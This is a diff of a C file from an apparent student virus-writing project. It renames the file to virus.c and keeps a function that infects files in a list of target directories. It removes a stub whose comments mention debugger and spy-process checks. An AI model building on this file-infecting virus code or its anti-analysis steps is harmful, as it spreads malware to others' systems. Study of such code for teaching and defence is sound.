@@ -1,21 +1,18 @@
 /* ************************************************************************** */
 /*                                                                            */
 /*                                                        :::      ::::::::   */
-/*   famine.c                                           :+:      :+:    :+:   */
+/*   virus.c                                            :+:      :+:    :+:   */
 /*                                                    +:+ +:+         +:+     */
 /*   By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
-/*   Created: 2019/06/04 00:21:46 by agrumbac          #+#    #+#             */
-/*   Updated: 2019/06/07 04:03:42 by agrumbac         ###   ########.fr       */
+/*   Created: 2019/06/07 06:36:21 by agrumbac          #+#    #+#             */
+/*   Updated: 2019/06/07 06:44:37 by agrumbac         ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
-#include <sys/types.h>
 #include "famine.h"
 
-#define ARRAY_SIZE(x) (sizeof(x) / sizeof(*x))
-
-void	virus()
+void	virus(void)
 {
 	const char *playgrounds[] =
 	{
@@ -27,12 +24,4 @@ void	virus()
 	{
 		infect_files_in(playgrounds[i]);
 	}
-}
-
-void		famine()
-{
-	// check debugger
-	// check spy process
-	virus();
-	// return to entry
 }
